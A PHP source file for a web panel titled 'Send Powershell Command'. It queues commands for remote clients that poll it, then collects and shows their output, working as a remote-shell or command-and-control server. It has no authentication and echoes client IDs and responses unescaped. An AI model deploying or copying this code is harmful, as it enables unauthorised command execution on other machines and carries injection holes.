<?php

if (filter_input(INPUT_SERVER, 'REQUEST_METHOD', FILTER_SANITIZE_FULL_SPECIAL_CHARS) == 'POST') {
    $p = filter_input_array(INPUT_POST, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData, true);
    if (!empty(($p["clientID"] ?? '')) && isset($p["sendCommand"])) {
        $lastPing = getDataFromJSON($p["clientID"], "lastPing");
        if ((time() - strtotime($lastPing)) <= 180) {
            setDataToJSON(["id" => $p["clientID"], "data" => ["command" => $p["sendCommand"], "response" => ""]]);
            $response = getDataFromJSON($p["clientID"], "response");
            while (empty($response)) {
                $response = getDataFromJSON($p["clientID"], "response");
            }
            $history = getDataFromJSON($p["clientID"], "history") . $response . "<br><br>";
            setDataToJSON(["id" => $p["clientID"], "data" => ["history" => $history]]);
            echo json_encode([["id" => "response", "content" => $history], ["id" => "status", "content" => statusView(["computerName" => $p["clientID"], "lastPing" => $lastPing])]]);
        } else {
            echo json_encode([["id" => "response", "content" => "The listener is not connected"], ["id" => "status", "content" => "Offline"]]);
        }
    } elseif (isset($data["computerName"])) {
        if (isset($data["response"])) {
            echo connectionWithClient();
        } else {
            $response = getDataFromJSON($data["computerName"], "response");
            $command = getDataFromJSON($data["computerName"], "command");
            if (!empty($command) && empty($response)) echo $command;
            setDataToJSON(["id" => $data["computerName"], "data" => ["lastPing" => date("Y-m-d H:i:s"), "command" => ""]]);
        }
    }
    exit();
} else {
    if (isset($_GET["action"]) == "viewClient" && isset($_GET["computerName"])) {
        echo json_encode([["id" => "content", "content" => sendCommandView(["computerName" => ($_GET["computerName"] ?? ""), "lastPing" => getDataFromJSON($_GET["computerName"], "lastPing")])]]);
        exit();
    } else {
        $v = "No Client is selected";
    }
}

function statusView($i) {
    if ((time() - strtotime($i["lastPing"])) <= 180) {
        $class = "success";
        $status = "Online";
    } else {
        $class = "danger";
        $status = "Offline";
    }
    return '<span id="status" class="fw-bold text-' . $class . '">' . $status . '</span>';
}

function sendCommandView($i) {
    setDataToJSON(["id" => $i["computerName"], "data" => ["history" => ""]]);
    $targetClient = $i["computerName"];
    $v = '<div class="card">
    <div class="card-body">
    <p id="response"><h5 class="text-primary">' . $targetClient . ' - ' . statusView($i) . '</h5></p>
    <form class="needs-validation" id="dynamicForm" action="./">
            <div class="row">
                <div class="col-8">
                    <input type="text" class="form-control" name="sendCommand" id="sendCommand">
                </div>
                <input type="hidden" name="clientID" value="' . $targetClient . '">
                <div class="col-4">
                    <button id="dSubmit" class="btn btn-primary me-3 mb-1">Send Command</button><span id="loading" style="display: none;"></span>
                </div>
            </div>
    </form></div></div>';
    return $v;
}

function setDataToJSON($clientData) {
    $filePath = __DIR__ . '/result.json';
    $jsonData = file_exists($filePath) ? file_get_contents($filePath) : null;
    $dataToSave = json_decode($jsonData, true) ?: array('clients' => array());
    $clientToUpdate = $clientData["id"];
    foreach (array_keys($clientData["data"]) as $cd) {
        $newCommandValue = $clientData["data"][$cd];
        if (isset($dataToSave['clients'][$clientToUpdate])) {
            $dataToSave['clients'][$clientToUpdate][$cd] = $newCommandValue;
        } else {
            $dataToSave['clients'][$clientToUpdate] = array($cd => $newCommandValue);
        }
    }
    $jsonString = json_encode($dataToSave, JSON_PRETTY_PRINT);
    file_put_contents($filePath, $jsonString);
}

function getDataFromJSON($clientID, $key) {
    $filePath = __DIR__ . '/result.json';
    $jsonData = file_exists($filePath) ? file_get_contents($filePath) : null;
    $data = json_decode($jsonData, true) ?: array('clients' => array());
    $clientIDToRetrieve = $clientID;
    if (isset($data['clients'][$clientIDToRetrieve])) {
        if (isset($data['clients'][$clientIDToRetrieve][$key])) $clientCommand = $data['clients'][$clientIDToRetrieve][$key];
        return $clientCommand ?? "";
    }
}

function connectionWithClient() {
    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData, true);
    $ext = "<span class='text-info'>Executed: " . ($data["executedCommand"] ?? "") . "</span><br>";
    if (isset($data['response'])) {
        if (is_array($data["response"])) {
            $extract = "";
            foreach ($data["response"] as $d) {
                if (is_array($d)) {
                    foreach ($d as $sd) {
                        $extract .= "$sd<br>";
                    }
                } else {
                    $extract .= "$d<br>";
                }
            }
        } else {
            $extract = $data["response"];
        }
        setDataToJSON(["id" => $data["computerName"], "data" => ["response" => $ext . $extract]]);
        return "Central server successfully executed command";
    } else {
        setDataToJSON(["id" => $data["computerName"], "data" => ["response" => $ext . "Client did not responded"]]);
    }
}

function clientList() {
    $list = "";
    $jsonData = file_get_contents('result.json');
    $data = json_decode($jsonData, true);
    if (isset($data['clients'])) {
        foreach (array_keys($data['clients']) as $client) {
            $list .= '<button type="button" onclick="get(`?action=viewClient&computerName=' . $client . '`)" class="client-button btn btn-light">' . $client . '</button>';
        }
    }
    return '<h3 class="text-center">Client List</h3>' . $list;
}
?>

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Send Powershell Command</title>
    <script src="bootstrap.min.js"></script>
    <link rel="stylesheet" href="bootstrap.min.css" />
    <script src="jquery.min.js"></script>
    <script src="common.js"></script>
    <link rel="stylesheet" href="common.css">
</head>

<body>
    <h3 class="mt-5 text-center">Send Powershell Command</h3>
    <div class="container-fluid">
        <div class="row m-5">
            <div class="col-md-8">
                <div id="content">
                    <?php echo $v ?? ""; ?>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card">
                    <div class="card-body" style="height: 425px; overflow-y: auto;">
                        <?php echo clientList(); ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>